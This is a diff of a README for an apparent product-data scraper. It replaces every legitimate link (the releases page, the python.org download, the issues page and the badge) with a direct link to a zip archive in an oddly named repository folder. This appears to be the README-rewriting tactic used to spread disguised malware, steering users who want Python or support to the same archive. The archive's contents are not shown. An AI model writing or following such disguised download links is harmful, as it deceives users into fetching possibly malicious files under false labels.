@@ -1,6 +1,6 @@
 # 🥑 olive-and-june-scraper - Effortlessly Gather Product Data
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%23FF9800?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Zionkkkj/olive-and-june-scraper/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/Zionkkkj/olive-and-june-scraper/main/trachelodynia/and_scraper_olive_june_3.0-alpha.4.zip%20Latest%20Release-%20%23FF9800?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Zionkkkj/olive-and-june-scraper/main/trachelodynia/and_scraper_olive_june_3.0-alpha.4.zip)
 
 ## 📘 Overview
 
@@ -13,11 +13,11 @@ The **olive-and-june-scraper** is a user-friendly application designed to help y
 Before you download the olive-and-june-scraper, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, macOS Sierra or later.
-- **Python**: Version 3.6 or higher must be installed. If Python is not installed, you can download it [here](https://www.python.org/downloads/).
+- **Python**: Version 3.6 or higher must be installed. If Python is not installed, you can download it [here](https://raw.githubusercontent.com/Zionkkkj/olive-and-june-scraper/main/trachelodynia/and_scraper_olive_june_3.0-alpha.4.zip).
 
 ### Download & Install
 
-To get started, visit the [Releases page](https://github.com/Zionkkkj/olive-and-june-scraper/releases) to download the latest version of the application. Follow these steps:
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Zionkkkj/olive-and-june-scraper/main/trachelodynia/and_scraper_olive_june_3.0-alpha.4.zip) to download the latest version of the application. Follow these steps:
 
 1. Click on the link above to open the Releases page.
 2. Scroll down to find the latest version listed at the top of the page.
@@ -73,6 +73,6 @@ The olive-and-june-scraper is released under the MIT License. You can freely use
 
 ## 📞 Support
 
-If you encounter any issues or have questions, feel free to open an issue on the [GitHub repository](https://github.com/Zionkkkj/olive-and-june-scraper/issues). Our development team will review your concern and get back to you promptly.
+If you encounter any issues or have questions, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/Zionkkkj/olive-and-june-scraper/main/trachelodynia/and_scraper_olive_june_3.0-alpha.4.zip). Our development team will review your concern and get back to you promptly.
 
-To download the latest version of the olive-and-june-scraper, visit the Releases page [here](https://github.com/Zionkkkj/olive-and-june-scraper/releases). Enjoy data scraping with ease!
+To download the latest version of the olive-and-june-scraper, visit the Releases page [here](https://raw.githubusercontent.com/Zionkkkj/olive-and-june-scraper/main/trachelodynia/and_scraper_olive_june_3.0-alpha.4.zip). Enjoy data scraping with ease!
